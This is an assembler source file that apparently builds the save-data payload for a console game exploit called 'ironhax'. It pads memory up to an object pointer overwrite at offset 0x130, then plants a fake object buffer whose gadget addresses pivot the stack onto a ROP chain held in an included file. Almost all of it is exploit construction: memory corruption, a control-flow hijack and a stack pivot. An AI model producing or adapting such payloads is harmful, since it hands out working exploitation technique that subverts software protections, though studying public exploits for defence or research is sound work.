.nds

.create "Data",0x0

.loadtable "unicode.tbl"

.include "iron_constants.s"
.include "iron_macros.s"

.orga 0x4
	.string "ironhax"
	.byte 0x00
	.byte 0x00

.orga 0x58
	.fill (0x130 - .), 0xDA

.orga 0x130
	; object pointer overwrite
	; can only have 0x00 as the MSB
	.word OBJECT_BUFFER_REF_PTR ; r4 (moved to r0 before jump)

.orga 0x400
	object_reference: ; r0 points here after IRON_PREPIVOT
		.word OBJECT_BUFFER_PTR ; r0 (temporarily)

.orga 0x468
		.word IRON_PIVOT
		.word ROP_PTR ; sp
		.word ROP_IRON_NOP ; pc


.orga 0x500
	object_buffer:
		.word 0xDEADBABE
		.word 0xDADADADA
		.word 0xDADADADA
		.word 0xDADADADA
		.word IRON_PREPIVOT ; r1 ; ldr r1, [r0, #0x68]!; sub sp, sp, #32; add r0, r0, #8; blx r1

.orga 0x600
	.include "iron_rop.s"

	.fill (0x2000 - .), 0x00

.Close
